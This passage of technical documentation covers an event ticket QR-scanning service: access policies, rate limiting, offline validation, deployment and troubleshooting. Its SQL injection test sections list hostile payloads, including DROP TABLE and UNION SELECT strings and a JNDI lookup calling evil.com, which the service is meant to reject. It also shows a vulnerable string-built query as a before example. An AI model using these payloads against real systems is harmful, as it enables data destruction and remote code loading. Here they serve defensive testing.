   b. Check scan_count: count >= max_reentries? → DENY (MAX_REENTRIES_REACHED)
   c. Check last_scanned_at: now - last < cooldown? → DENY (COOLDOWN_ACTIVE)
   d. All checks pass? → ALLOW (increment scan_count)

3. Update ticket:
   - scan_count += 1
   - last_scanned_at = NOW()
   - first_scanned_at = COALESCE(first_scanned_at, NOW())

Code: src/services/QRValidator.ts (checkReentryPolicy method)
```

**Why it matters:**
- Supports multi-day festivals (legitimate re-entry)
- Prevents abuse (cooldown + max limit)
- Flexible per-event configuration
- Tracks entry history

**Common Configurations:**
- Single-day concert: enabled=false
- Multi-day festival: enabled=true, cooldown=60min, max=10
- Stadium event: enabled=true, cooldown=30min, max=2
- Club: enabled=true, cooldown=15min, max=5

### 4. Zone-Based Access Control ✅

**Implementation:**
```typescript
// Hierarchical access control

Zone Hierarchy:
BACKSTAGE: ["BACKSTAGE"]              // Most restrictive
VIP:       ["VIP", "GA"]              // VIP + General
GA:        ["GA"]                     // General only
ALL:       ["BACKSTAGE", "VIP", "GA"] // Full access

Validation:
1. Get ticket access_level (BACKSTAGE/VIP/GA/ALL)
2. Get device zone (BACKSTAGE/VIP/GA/ALL)
3. Check: device.zone IN allowedZones[ticket.access_level]
4. DENY if mismatch (WRONG_ZONE)

Examples:
- VIP ticket + GA scanner: ALLOW (VIP can access GA)
- GA ticket + VIP scanner: DENY (GA can't access VIP)
- BACKSTAGE ticket + VIP scanner: DENY (BACKSTAGE is separate)
- ALL ticket + any scanner: ALLOW (full access)

Code: src/services/QRValidator.ts (checkAccessZone method)
```

**Why it matters:**
- Keeps VIP areas secure
- Prevents GA access to restricted zones
- Flexible for different venue layouts
- Clear access rules

**Configuration:**
- Device zone set during registration
- Ticket access_level set during purchase
- Policy: strict (enforced) or loose (warnings only)
- VIP all-access: VIP tickets access all zones

### 5. Multi-Layered Rate Limiting ✅

**Implementation:**
```typescript
// ISSUE #26 SECURITY FIX: Prevents brute-force QR scanning

Layer 1: Per-IP + Device (scanRateLimiter)
- Window: 1 minute
- Max: 10 scan attempts
- Key: IP:deviceId
- Applied to: POST /api/scan

Layer 2: Per-Device (deviceRateLimiter)
- Window: 5 minutes
- Max: 50 scans
- Key: deviceId
- Applied to: POST /api/scan

Layer 3: Per-Staff (staffRateLimiter)
- Window: 1 minute
- Max: 30 scans
- Key: staffUserId
- Applied to: POST /api/scan

Layer 4: Failed Attempts (failedAttemptLimiter)
- Window: 10 minutes
- Max: 5 failed attempts
- Key: IP:deviceId:staffId
- Locks account on exceed
- Only counts failed scans

Code: src/middleware/rate-limit.middleware.ts
Storage: Redis (distributed rate limiting)
```

**Why it matters:**
- Prevents brute-force QR guessing
- Limits abuse per device/staff
- Protects against DoS attacks
- Locks accounts after repeated failures

**Response on Limit:**
```
429 Too Many Requests
{
  "message": "Too many scan attempts. Please wait before trying again."
}
```

### 6. Offline Scanning ✅

**Implementation:**
```typescript
// 4-hour manifest with offline validation tokens

Manifest Generation:
1. Query all tickets for event (status: SOLD, MINTED)
2. For each ticket:
   a. Generate offline_token: HMAC-SHA256(ticketId:eventId:offline, HMAC_SECRET)
   b. Package: ticketNumber, access_level, scan_count, last_scanned_at
3. Store in offline_validation_cache table
4. Set valid_until = now + 4 hours
5. Return manifest to device

Offline Validation (on device):
1. Parse scanned QR code
2. Look up ticket in local manifest
3. Validate offline_token matches
4. Check access_level vs device zone
5. Record scan locally (ALLOW/DENY)
6. Update local scan_count

Reconciliation (when online):
1. Device sends array of offline scans
2. Server processes each:
   a. Check for duplicates (already reconciled?)
   b. Validate device exists
   c. Insert into scans table
   d. Update ticket scan_count
3. Return results per scan

Code: 
- src/services/OfflineCache.js (manifest generation)
- src/services/QRGenerator.ts (offline token generation)
- src/routes/offline.ts (reconciliation endpoint)
```

**Why it matters:**
- Works in areas with poor connectivity
- Outdoor festivals, rural venues
- No internet interruption of scanning
- Syncs back when connectivity restored

**Limitations:**
- Manifest expires after 4 hours (regenerate)
- No real-time duplicate detection while offline
- Reconciliation required after event
- Device must have storage capacity

### 7. SQL Injection Prevention ✅

**Implementation:**
```typescript
// Parameterized queries + input validation + whitelisting

BEFORE (Vulnerable):
await pool.query(`
  SELECT * FROM scans
  WHERE ticket_id = '${ticketId}'
  AND scanned_at > NOW() - INTERVAL '${windowMinutes} minutes'
`);

AFTER (Secure):
// 1. Input validation
const minutes = Number.parseInt(String(windowMinutes), 10);
if (!Number.isFinite(minutes) || minutes < 0 || minutes > 1440) {
  throw new Error('Invalid window: must be 0-1440 minutes');
}

// 2. Parameterized query
await pool.query(`
  SELECT * FROM scans
  WHERE ticket_id = $1
  AND scanned_at > NOW() - make_interval(mins => $2)
`, [ticketId, minutes]);

// 3. Whitelist validation for time ranges
const validRanges: Record<string, number> = {
  '1 hour': 1,
  '6 hours': 6,
  '12 hours': 12,
  '24 hours': 24,
  '7 days': 168,
  '30 days': 720
};
const hours = validRanges[timeRange];
if (!hours) {
  throw new Error('Invalid time range');
}

Code: src/services/QRValidator.ts
Tests: tests/sql-injection.test.ts
```

**Why it matters:**
- Prevents SQL injection attacks
- Malicious QR codes can't inject SQL
- Input validation before queries
- Test coverage for attack vectors

**Test Cases:**
```typescript
Malicious Inputs Tested:
- "5'; DROP TABLE ticket_scans;--"
- "1 OR 1=1"
- "1' UNION SELECT NULL--"
- "1; DELETE FROM users;--"
- "${jndi:ldap://evil.com/a}"

All rejected with validation errors
```

### 8. Comprehensive Audit Trail ✅

**Implementation:**
```typescript
// Every scan attempt logged, no deletions

scans table (permanent record):
- ticket_id (what was scanned)
- device_id (where it was scanned)
- result (ALLOW/DENY/ERROR)
- reason (VALID_ENTRY, DUPLICATE, INVALID_QR, etc.)
- scanned_at (timestamp)
- metadata (additional context)

Logging Strategy:
1. Log BEFORE validation (security)
2. Record result after validation
3. Never delete scans (legal/compliance)
4. Index on scanned_at DESC (recent queries)
5. Partition by month (performance)

Additional Logging:
- Winston logs (structured JSON)
- Prometheus metrics (counters)
- Redis cache events
- Scan event emission

Code: src/services/QRValidator.ts (logScan method)
```

**Why it matters:**
- Security investigations
- Dispute resolution
- Capacity analytics
- Fraud pattern detection
- Legal compliance
- Revenue reconciliation

**Query Examples:**
```sql
-- Recent denied scans (potential fraud)
SELECT * FROM scans
WHERE result = 'DENY'
AND scanned_at > NOW() - INTERVAL '1 hour'
ORDER BY scanned_at DESC;

-- Ticket scan history
SELECT * FROM scans
WHERE ticket_id = 'uuid'
ORDER BY scanned_at ASC;

-- Device activity
SELECT 
  result,
  reason,
  COUNT(*) as count
FROM scans
WHERE device_id = 1
AND scanned_at > NOW() - INTERVAL '1 day'
GROUP BY result, reason;
```

### 9. Prometheus Metrics ✅

**Implementation:**
```typescript
// Real-time operational metrics

Counters:
- scans_allowed_total (total successful scans)
- scans_denied_total{reason} (labeled by deny reason)

Histograms:
- scan_latency_seconds (p50, p95, p99 latency)
- qr_generation_duration_seconds

Gauges:
- Active connections
- Queue depth
- Cache hit rate

Collection:
1. Metrics updated inline during operations
2. Prometheus scrapes GET /metrics every 15s
3. Grafana dashboards visualize
4. Alerting on anomalies

Code: src/utils/metrics.ts
```

**Why it matters:**
- Real-time operational visibility
- Performance monitoring
- Capacity planning
- Anomaly detection
- SLA compliance

**Key Metrics:**
```
scans_allowed_total: 12,450
scans_denied_total{reason="DUPLICATE"}: 125
scans_denied_total{reason="INVALID_QR"}: 15
scans_denied_total{reason="WRONG_ZONE"}: 8

scan_latency_seconds{quantile="0.5"}: 0.085  // 85ms p50
scan_latency_seconds{quantile="0.95"}: 0.250 // 250ms p95
scan_latency_seconds{quantile="0.99"}: 0.500 // 500ms p99
```

### 10. Device Management ✅

**Implementation:**
```typescript
// Device registration, authorization, revocation

Device Lifecycle:
1. Registration:
   - Generate device_id or accept provided
   - Assign zone (GA/VIP/BACKSTAGE/ALL)
   - Store metadata (type, venue, IP, user agent)
   - Mark as active

2. Authorization:
   - Every scan checks device is_active
   - Inactive devices rejected immediately
   - Zone validation per scan

3. Sync Tracking:
   - last_sync_at updated on manifest download
   - Offline capability flag
   - Reconciliation tracking

4. Revocation:
   - Set is_active = false
   - Record revoked_by, revoked_at, revoked_reason
   - Device immediately blocked from scanning

Code: src/services/DeviceManager.js
```

**Why it matters:**
- Control which devices can scan
- Track device activity
- Revoke lost/stolen devices immediately
- Audit device usage
- Zone-based authorization

**Device Types:**
- mobile: iOS/Android phones
- tablet: iPad/Android tablets
- dedicated: Purpose-built scanners

**Use Cases:**
- Register new scanner: POST /api/devices/register
- List venue devices: GET /api/devices
- Revoke device: DeviceManager.revokeDevice()
- Track activity: Monitor last_sync_at

---

## SECURITY

### 1. QR Code Security

**HMAC-SHA256 Signatures:**
```typescript
// Cryptographically secure QR codes

Secret: HMAC_SECRET environment variable
- Minimum 32 bytes (256 bits)
- Generated once, never changed
- Stored securely (env var, secrets manager)

Signature Generation:
data = `${ticketId}:${timestamp}`
hmac = crypto.createHmac('sha256', HMAC_SECRET)
             .update(data)
             .digest('hex')

Signature Validation:
1. Recalculate HMAC from QR data
2. Constant-time comparison (prevents timing attacks)
3. Reject if mismatch

Security Properties:
- Can't forge QRs without HMAC_SECRET
- Can't modify ticketId or timestamp
- Can't replay old QRs (timestamp check)
- 256-bit security (SHA-256)
```

**Time-Based Expiry:**
```typescript
QR_ROTATION_SECONDS = 30 (default)

Validation:
now = Date.now()
age = now - qrTimestamp

if (age > 30000) { // 30 seconds in milliseconds
  reject('QR_EXPIRED')
}

Benefits:
- Prevents screenshot sharing
- Forces fresh QR generation
- Limits exposure window
- User-friendly (30s is reasonable)
```

### 2. Rate Limiting (ISSUE #26 FIX)

**Multi-Level Protection:**
```typescript
// Prevents brute-force attacks

Level 1: IP + Device (10/min)
- Stops distributed brute force
- Allows normal scanning speed
- Blocks rapid automated attempts

Level 2: Device (50/5min)
- Limits per-device abuse
- Normal event: ~10 scans/min sustainable
- Large event: 50 scans/5min = manageable

Level 3: Staff (30/min)
- Prevents compromised staff accounts
- Allows fast scanning (2s/scan)
- Blocks automated abuse

Level 4: Failed Attempts (5/10min)
- Tracks invalid QR submissions
- Locks after 5 failed attempts
- Prevents QR guessing attacks
- Manual unlock required

Implementation: Redis-backed (distributed)
```

**Logging & Monitoring:**
```typescript
// ISSUE #26: Enhanced security logging

Every Scan Logged:
- Device ID
- Staff user ID
- IP address
- User agent
- Result (ALLOW/DENY)
- Reason (if DENY)
- Timestamp

Alerts Triggered:
- High failure rate (>10% denied)
- Suspicious patterns (same IP, multiple devices)
- Invalid QR attempts (INVALID_QR reason)
- Rate limit violations

Code: src/services/QRValidator.ts (validateScan method)
```

### 3. SQL Injection Prevention

**Comprehensive Protection:**
```typescript
1. Parameterized Queries (ALL queries)
   - Never string concatenation
   - Use $1, $2, $3 placeholders
   - PostgreSQL handles escaping

2. Input Validation
   - Type checking (parseInt)
   - Range validation (0-1440 minutes)
   - Whitelist allowed values

3. Whitelist Patterns
   - Time ranges: predefined map
   - Enum values: strict matching
   - UUIDs: format validation

Code: src/services/QRValidator.ts
Tests: tests/sql-injection.test.ts
```

### 4. Device Authorization

**Access Control:**
```typescript
Every Scan Checks:
1. Device exists (device_id in devices table)
2. Device is active (is_active = true)
3. Device zone matches ticket access_level

Reject Immediately:
- Unknown device_id
- Inactive device
- Wrong zone

Security Benefits:
- Stolen devices blocked instantly
- Lost devices revoked remotely
- Zone enforcement prevents unauthorized access
- Audit trail per device
```

### 5. Offline Security

**Offline Token Validation:**
```typescript
// Can't forge offline tokens without HMAC_SECRET

Offline Token Generation:
data = `${ticketId}:${eventId}:offline`
token = crypto.createHmac('sha256', HMAC_SECRET)
              .update(data)
              .digest('hex')

Offline Validation (on device):
1. Recalculate expected token
2. Compare with manifest token
3. Reject if mismatch

Manifest Expiry:
- 4 hours validity
- Must regenerate after expiry
- Prevents stale data abuse
```

### 6. PII Protection

**Data Minimization:**
```typescript
// Minimal PII in scanning service

Stored Data:
- Ticket ID (UUID, not PII)
- Device ID (identifier, not PII)
- Staff user ID (reference, not personal)
- IP address (pseudonymous, short retention)

NOT Stored:
- Patron names
- Email addresses
- Phone numbers
- Payment information

Log Sanitization:
- Remove sensitive fields before logging
- Hash identifiers where possible
- Short retention (30 days)
```

---

## ERROR HANDLING

### Error Response Format

```json
{
  "success": false,
  "error": "ERROR_CODE",
  "message": "Human-readable error message"
}
```

### Common Error Codes

```typescript
// QR Errors
QR_EXPIRED: "QR code expired. Please refresh." (QR >30s old)
INVALID_QR: "Invalid QR code" (HMAC validation failed)
INVALID_QR_FORMAT: "Invalid QR format" (not 3 parts)
QR_GENERATION_ERROR: "Failed to generate QR code"

// Validation Errors
MISSING_PARAMETERS: "qr_data and device_id are required"
MISSING_QR_DATA: "QR data is required"
MISSING_DEVICE_ID: "Device ID is required"
MISSING_TEMPLATE_ID: "Template ID is required"
INVALID_REQUEST: "Invalid request format"

// Ticket Errors
TICKET_NOT_FOUND: "Ticket not found"
INVALID_STATUS: "Ticket status: {status}" (not SOLD/MINTED)

// Device Errors
UNAUTHORIZED_DEVICE: "Device not authorized"
DEVICE_NOT_FOUND: "Device not found"
DEVICE_LIST_ERROR: "Failed to list devices"
REGISTRATION_ERROR: "Failed to register device"

// Access Control Errors
WRONG_ZONE: "This ticket requires {required} access. Device is in {deviceZone} zone."

// Duplicate/Re-entry Errors
DUPLICATE: "Ticket already scanned"
NO_REENTRY: "Re-entry not allowed"
REENTRY_DISABLED: "Re-entry policy disabled"
COOLDOWN_ACTIVE: "Please wait {minutes} minutes before re-entry"
MAX_REENTRIES_REACHED: "Maximum re-entries reached"

// Policy Errors
EVENT_NOT_FOUND: "Event not found"
FETCH_ERROR: "Failed to fetch policies"
APPLY_ERROR: "Failed to apply template"
UPDATE_ERROR: "Failed to update policies"

// Offline Errors
MANIFEST_ERROR: "Failed to generate manifest"
RECONCILIATION_ERROR: "Failed to reconcile scans"

// System Errors
INTERNAL_ERROR: "Failed to process scan"
SYSTEM_ERROR: "System error during scan validation"
```

### HTTP Status Codes

```
200: Success
400: Bad Request (validation errors, deny results)
404: Not Found (event, device)
429: Too Many Requests (rate limit)
500: Internal Server Error (database errors, system failures)
503: Service Unavailable (dependencies down)
```

---

## TESTING

### Test Files

```
tests/
├── setup.ts                           # Test configuration
├── sql-injection.test.ts              # SQL injection prevention tests
└── (future test files)

Coverage Targets:
- Branches: 80%
- Functions: 80%
- Lines: 80%
- Statements: 80%
```

### SQL Injection Tests

```typescript
// tests/sql-injection.test.ts

Test Cases:
1. SQL comment injection: "5'; DROP TABLE ticket_scans;--"
2. Boolean injection: "1 OR 1=1"
3. UNION injection: "1' UNION SELECT NULL--"
4. DELETE injection: "1; DELETE FROM users;--"
5. JNDI injection: "${jndi:ldap://evil.com/a}"

All cases: MUST throw validation error
Valid input: MUST work correctly

Example:
it('rejects injection attempt: ${payload}', async () => {
  await expect(
    qrValidator.isRecentlyScanned('valid-uuid', payload)
  ).rejects.toThrow('Invalid window');
});
```

### Running Tests

```bash
# Run all tests
npm test

# Watch mode
npm run test:watch

# Coverage report
npm run test:coverage

# Type checking
npm run typecheck
```

### Manual Testing

```bash
# Test QR generation
curl http://localhost:3007/api/qr/generate/550e8400-e29b-41d4-a716-446655440000

# Test scanning
curl -X POST http://localhost:3007/api/scan \
  -H "Content-Type: application/json" \
  -d '{
    "qr_data": "550e8400-e29b-41d4-a716-446655440000:1728907800000:a3f5b2c1...",
    "device_id": "SCANNER-ABC123"
  }'

# Test device registration
curl -X POST http://localhost:3007/api/devices/register \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "SCANNER-TEST-001",
    "name": "Test Scanner",
    "zone": "GA"
  }'

# Test offline manifest
curl "http://localhost:3007/api/offline/manifest/event-uuid?device_id=SCANNER-ABC123"

# Test health check
curl http://localhost:3007/health

# Test metrics
curl http://localhost:3007/metrics

# Test policy templates
curl http://localhost:3007/api/policies/templates

# Test event policies
curl http://localhost:3007/api/policies/event/event-uuid-here
```

### Integration Testing

```bash
# Full scan flow test
1. Generate QR code
2. Immediately scan (should ALLOW)
3. Wait 35 seconds
4. Try to scan again (should DENY: QR_EXPIRED)
5. Generate new QR
6. Scan again (should check duplicate window)
7. If within 10 min: DENY (DUPLICATE)
8. If > 10 min: ALLOW (or check re-entry policy)

# Zone access test
1. Register VIP device
2. Scan GA ticket (should DENY: WRONG_ZONE)
3. Scan VIP ticket (should ALLOW)
4. Register GA device
5. Scan VIP ticket (should ALLOW - VIP can access GA)

# Rate limiting test
1. Send 15 scan requests in 1 minute
2. After 10: Should get 429 Too Many Requests
3. Wait 1 minute
4. Try again (should work)

# Offline flow test
1. Download manifest for event
2. Disconnect network
3. Validate tickets using offline tokens
4. Record scans locally
5. Reconnect network
6. POST to /api/offline/reconcile
7. Verify scans appear in database
```

---

## DEPLOYMENT

### Environment Variables

```bash
# Server Configuration
PORT=3007
NODE_ENV=production

# Database
DB_HOST=postgres
DB_PORT=5432
DB_NAME=tickettoken_db
DB_USER=postgres
DB_PASSWORD=your_secure_password

# Redis
REDIS_HOST=redis
REDIS_PORT=6379
REDIS_PASSWORD=your_redis_password

# Security
HMAC_SECRET=your-256-bit-secret-key-change-in-production

# QR Configuration
QR_ROTATION_SECONDS=30

# Logging
LOG_LEVEL=info
LOG_FILE=scanning-service.log

# Offline Configuration
OFFLINE_CACHE_DURATION_MINUTES=240  # 4 hours
```

### Docker Deployment

**Dockerfile:**
```dockerfile
FROM node:20-alpine

WORKDIR /app

# Copy shared module first
COPY backend/shared /shared
WORKDIR /shared
RUN npm install

# Go back to app directory
WORKDIR /app

# Copy and install scanning service
COPY backend/services/scanning-service/package.json ./
RUN npm install
RUN npm install --save-dev typescript @types/cors @types/uuid @types/express @types/node

# Copy source
COPY backend/services/scanning-service/ ./

# Build TypeScript
RUN npm run build

EXPOSE 3007
CMD ["npm", "start"]
```

**Docker Compose:**
```yaml
services:
  scanning-service:
    build:
      context: .
      dockerfile: backend/services/scanning-service/Dockerfile
    ports:
      - "3007:3007"
    environment:
      - PORT=3007
      - DB_HOST=postgres
      - DB_PORT=5432
      - DB_NAME=tickettoken_db
      - DB_USER=postgres
      - DB_PASSWORD=${DB_PASSWORD}
      - REDIS_HOST=redis
      - REDIS_PORT=6379
      - HMAC_SECRET=${HMAC_SECRET}
      - QR_ROTATION_SECONDS=30
      - NODE_ENV=production
    depends_on:
      - postgres
      - redis
    restart: unless-stopped
    networks:
      - tickettoken-network

  postgres:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=tickettoken_db
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=${DB_PASSWORD}
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - tickettoken-network

  redis:
    image: redis:7-alpine
    command: redis-server --requirepass ${REDIS_PASSWORD}
    volumes:
      - redis-data:/data
    networks:
      - tickettoken-network

volumes:
  postgres-data:
  redis-data:

networks:
  tickettoken-network:
    driver: bridge
```

### Startup Order

```
1. PostgreSQL must be running and accessible
2. Redis must be running and accessible
3. Database tables must exist (run migrations first)
4. Environment variables must be set
5. Start scanning-service: npm start
6. Service listens on port 3007
7. Health check: GET /health should return 200
```

### Build Commands

```bash
# Development
npm run dev          # Start with hot reload (tsx watch)

# Production
npm run build        # Compile TypeScript to dist/
npm start            # Run compiled JavaScript

# Testing
npm test             # Run Jest tests
npm run typecheck    # TypeScript type checking

# Cleanup
npm run clean        # Remove dist/ folder
```

---

## MONITORING

### Prometheus Metrics

**Available Metrics:**

```
# Counters
scans_allowed_total
  - Total number of successful scans
  
scans_denied_total{reason}
  - Total denied scans, labeled by reason
  - Labels: DUPLICATE, INVALID_QR, WRONG_ZONE, etc.
  
http_requests_total{method, route, status}
  - Total HTTP requests

# Histograms
scan_latency_seconds
  - Scan operation duration
  - Buckets: 0.1s, 0.5s, 1s, 2s, 5s
  - Provides: p50, p95, p99 percentiles
  
qr_generation_duration_seconds
  - QR generation time
  - Buckets: 0.05s, 0.1s, 0.5s, 1s
  
http_request_duration_seconds{method, route, status}
  - HTTP request duration

# Default Metrics (from prom-client)
nodejs_heap_size_total_bytes
nodejs_heap_size_used_bytes
nodejs_external_memory_bytes
nodejs_gc_duration_seconds
process_cpu_user_seconds_total
process_cpu_system_seconds_total
process_resident_memory_bytes
```

**Grafana Dashboard Queries:**

```promql
# Scan rate (scans per minute)
rate(scans_allowed_total[1m]) * 60

# Deny rate by reason
rate(scans_denied_total[5m]) * 60

# Success rate (%)
(rate(scans_allowed_total[5m]) / 
 (rate(scans_allowed_total[5m]) + rate(scans_denied_total[5m]))) * 100

# p95 latency
histogram_quantile(0.95, rate(scan_latency_seconds_bucket[5m]))

# p99 latency
histogram_quantile(0.99, rate(scan_latency_seconds_bucket[5m]))

# Error rate
rate(scans_denied_total{reason="INTERNAL_ERROR"}[5m]) * 60
```

### Logging

**Winston Logger Configuration:**

```typescript
// Structured JSON logging
{
  "level": "info",                    // error, warn, info, debug
  "timestamp": "2025-10-14T10:30:00.000Z",
  "service": "scanning-service",
  "component": "QRValidator",
  "message": "Scan processed",
  "ticketId": "550e8400-...",
  "deviceId": "SCANNER-ABC123",
  "result": "ALLOW",
  "latency": 0.125                    // seconds
}

// Log Levels:
- error: System errors, database failures
- warn: Invalid QR attempts, security events
- info: Scan events, device registrations
- debug: Detailed validation steps
```

**Log Files:**

```
Location: scanning-service.log (configurable)
Rotation: 10MB max size, keep 5 files
Format: JSON (for log aggregation)
Retention: 30 days (configurable)
```

**Important Events Logged:**

```typescript
// Security Events
- Invalid QR scan attempts (reason: INVALID_QR)
- Brute-force detection (multiple failed attempts)
- Rate limit violations
- Unauthorized device attempts

// Operational Events
- Device registration/revocation
- Policy changes
- Offline manifest generation
- Scan reconciliation
- Database connection issues

// Performance Events
- Slow scans (>1 second)
- Redis connection failures
- Database query timeouts
```

### Health Checks

**1. Liveness Check (GET /health)**
```
Purpose: Is service running?
Check: HTTP server responding
Frequency: Every 10 seconds
Timeout: 2 seconds
Failure Action: Restart container

Response:
{
  "status": "healthy",
  "service": "scanning-service",
  "timestamp": "2025-10-14T10:30:00.000Z"
}
```

**2. Readiness Check (GET /health/db)**
```
Purpose: Can service handle requests?
Check: Database connection
Frequency: Every 30 seconds
Timeout: 5 seconds
Failure Action: Remove from load balancer

Success (200):
{
  "status": "ok",
  "database": "connected",
  "service": "scanning-service"
}

Failure (503):
{
  "status": "error",
  "database": "disconnected",
  "error": "connection timeout",
  "service": "scanning-service"
}
```

**3. Deep Health Check (Future)**
```
GET /health/deep

Checks:
- PostgreSQL connection (SELECT 1)
- Redis connection (PING)
- Database schema version
- Critical tables exist
- Recent scan activity

Response:
{
  "status": "healthy",
  "components": {
    "database": {
      "status": "healthy",
      "responseTime": 15,  // ms
      "version": "15.4"
    },
    "redis": {
      "status": "healthy",
      "responseTime": 2,
      "connected": true
    },
    "recentScans": {
      "last5Min": 125,
      "lastHour": 1450
    }
  },
  "timestamp": "2025-10-14T10:30:00.000Z"
}
```

### Alerting Rules

**Critical Alerts (Page On-Call):**

```yaml
# Service Down
- alert: ScanningServiceDown
  expr: up{job="scanning-service"} == 0
  for: 2m
  severity: critical
  message: Scanning service is down for 2+ minutes

# Database Connection Failed
- alert: DatabaseConnectionFailed
  expr: scanning_db_connection_failures_total > 0
  for: 1m
  severity: critical
  message: Cannot connect to database

# High Error Rate
- alert: HighErrorRate
  expr: rate(scans_denied_total{reason="INTERNAL_ERROR"}[5m]) > 10
  for: 5m
  severity: critical
  message: More than 10 errors/min for 5+ minutes

# All Scans Failing
- alert: AllScansFailing
  expr: rate(scans_allowed_total[5m]) == 0 AND rate(scans_denied_total[5m]) > 0
  for: 5m
  severity: critical
  message: No successful scans in 5 minutes
```

**Warning Alerts (Slack/Email):**

```yaml
# High Deny Rate
- alert: HighDenyRate
  expr: (rate(scans_denied_total[5m]) / (rate(scans_allowed_total[5m]) + rate(scans_denied_total[5m]))) > 0.20
  for: 10m
  severity: warning
  message: >20% of scans denied for 10+ minutes

# Slow Response Time
- alert: SlowResponseTime
  expr: histogram_quantile(0.95, rate(scan_latency_seconds_bucket[5m])) > 1
  for: 10m
  severity: warning
  message: p95 latency >1 second for 10+ minutes

# Rate Limiting Active
- alert: RateLimitingActive
  expr: rate(http_requests_total{status="429"}[5m]) > 5
  for: 5m
  severity: warning
  message: >5 rate limit hits/min

# Redis Connection Issues
- alert: RedisConnectionIssues
  expr: redis_connection_errors_total > 0
  for: 5m
  severity: warning
  message: Redis connection problems detected

# Offline Manifest Failures
- alert: OfflineManifestFailures
  expr: rate(offline_manifest_errors_total[10m]) > 0
  for: 5m
  severity: warning
  message: Offline manifest generation failing
```

---

## TROUBLESHOOTING

### Common Issues

**1. "QR code expired" errors**

```
Symptom: All QR scans failing with QR_EXPIRED
Cause: System clock drift or QR_ROTATION_SECONDS misconfigured

Diagnosis:
- Check server time: date
- Check QR_ROTATION_SECONDS env var
- Verify QR timestamp matches current time

Fix:
- Sync system clock: ntpdate -s time.nist.gov
- Increase QR_ROTATION_SECONDS if needed (default: 30)
- Restart service after env change

Prevention:
- Use NTP time sync
- Monitor clock drift
- Alert on time skew >5 seconds
```

**2. "Device not authorized" errors**

```
Symptom: Valid device_id rejected with UNAUTHORIZED_DEVICE
Cause: Device not registered or marked inactive

Diagnosis:
SELECT * FROM devices WHERE device_id = 'SCANNER-ABC123';
- Check is_active column
- Check device exists

Fix:
- Register device: POST /api/devices/register
- Or activate: UPDATE devices SET is_active = true WHERE device_id = '...'

Prevention:
- Device registration process
- Periodic device audit
- Alert on unauthorized attempts
```

**3. "Ticket already scanned" false positives**

```
Symptom: Legitimate patrons denied with DUPLICATE
Cause: Duplicate window too long OR Redis cache not clearing

Diagnosis:
- Check scan_policies for event
- Query scans table for ticket
- Check Redis: GET scan:duplicate:{ticketId}

SELECT * FROM scans 
WHERE ticket_id = 'ticket-uuid' 
ORDER BY scanned_at DESC LIMIT 5;

SELECT config FROM scan_policies 
WHERE event_id = 'event-uuid' 
AND policy_type = 'DUPLICATE_WINDOW';

Fix:
- Reduce duplicate window if too long
- Clear Redis cache: DEL scan:duplicate:{ticketId}
- Check if re-entry policy should be enabled

Prevention:
- Set appropriate duplicate windows
- Enable re-entry for multi-day events
- Test policies before event
```

**4. "Wrong zone" errors**

```
Symptom: Valid tickets denied with WRONG_ZONE
Cause: Device zone doesn't match ticket access_level

Diagnosis:
SELECT access_level FROM tickets WHERE id = 'ticket-uuid';
SELECT zone FROM devices WHERE device_id = 'SCANNER-ABC123';

Fix:
- Update device zone: 
  UPDATE devices SET zone = 'VIP' WHERE device_id = '...';
- Or use correct scanner for ticket type
- Or set device zone to 'ALL' for multi-zone scanner

Prevention:
- Label scanners clearly by zone
- Train staff on zone restrictions
- Use 'ALL' zone for flexible scanners
```

**5. Rate limiting blocking legitimate scans**

```
Symptom: 429 Too Many Requests during busy periods
Cause: Rate limits too restrictive for venue capacity

Diagnosis:
- Check current rate limits in middleware
- Monitor scan rate: rate(scans_allowed_total[1m])
- Calculate expected scan rate: venue_capacity / entry_duration

Fix:
- Increase rate limits in rate-limit.middleware.ts
- Deploy more scanning devices
- Optimize scan flow (faster validation)

Temporary:
- Manually reset Redis rate limit keys:
  DEL ratelimit:ip:{ip}
  DEL ratelimit:device:{deviceId}

Prevention:
- Load test before large events
- Right-size rate limits for venue
- Monitor scan throughput
```

**6. Offline manifest not syncing**

```
Symptom: Devices can't download offline manifest
Cause: Cache generation failed OR device not authorized

Diagnosis:
SELECT * FROM scanner_devices 
WHERE device_id = 'SCANNER-ABC123';
- Check can_scan_offline = true
- Check is_active = true

SELECT COUNT(*) FROM offline_validation_cache 
WHERE event_id = 'event-uuid' 
AND valid_until > NOW();

Fix:
- Enable offline: 
  UPDATE scanner_devices 
  SET can_scan_offline = true 
  WHERE device_id = '...';
- Regenerate manifest:
  (Call manifest endpoint manually)

Prevention:
- Verify offline capability during setup
- Pre-generate manifests before events
- Monitor manifest expiry
```

**7. Database connection pool exhausted**

```
Symptom: "Database not initialized" errors OR timeouts
Cause: Too many concurrent connections OR connections not released

Diagnosis:
- Check PostgreSQL connections:
  SELECT count(*) FROM pg_stat_activity 
  WHERE datname = 'tickettoken_db';
- Check pool config (max: 20)
- Look for slow queries

Fix:
- Increase pool size in database.ts (carefully)
- Identify slow queries and optimize
- Restart service to reset pool

Prevention:
- Always use client.release()
- Use transactions efficiently
- Monitor connection count
- Index frequently queried columns
```

**8. Redis connection lost**

```
Symptom: Duplicate detection fails, rate limiting stops
Cause: Redis server down OR network issues

Diagnosis:
- Check Redis: redis-cli ping
- Check connection in logs
- Test from service: redis-cli -h redis ping

Fix:
- Restart Redis: docker restart redis
- Check network connectivity
- Verify REDIS_HOST and REDIS_PORT

Impact:
- Duplicate detection uses DB fallback (slower)
- Rate limiting disabled (security risk)
- Service continues but degraded

Prevention:
- Redis clustering for HA
- Monitor Redis health
- Alert on connection failures
```

**9. HMAC validation failures**

```
Symptom: All QRs rejected with INVALID_QR
Cause: HMAC_SECRET changed OR mismatch between services

Diagnosis:
- Check HMAC_SECRET env var
- Verify QR generation uses same secret
- Test with known-good QR code

Fix:
- Ensure HMAC_SECRET matches across all services
- Don't change HMAC_SECRET in production
- Restart service after secret change

Prevention:
- Store HMAC_SECRET in secrets manager
- Version control for secret rotation
- Test secret changes in staging first
```

**10. TypeScript compilation errors**

```
Symptom: npm run build fails
Cause: Type errors OR missing dependencies

Diagnosis:
npm run typecheck
- Review errors
- Check for missing @types packages

Fix:
- Install missing types: npm install --save-dev @types/{package}
- Fix type errors in code
- Update tsconfig.json if needed

Prevention:
- Run typecheck in CI/CD
- Use strict TypeScript settings
- Keep dependencies updated
```

### Performance Optimization

**Slow Scans (>500ms)**

```
Target: < 500ms p95 latency

Optimization Checklist:
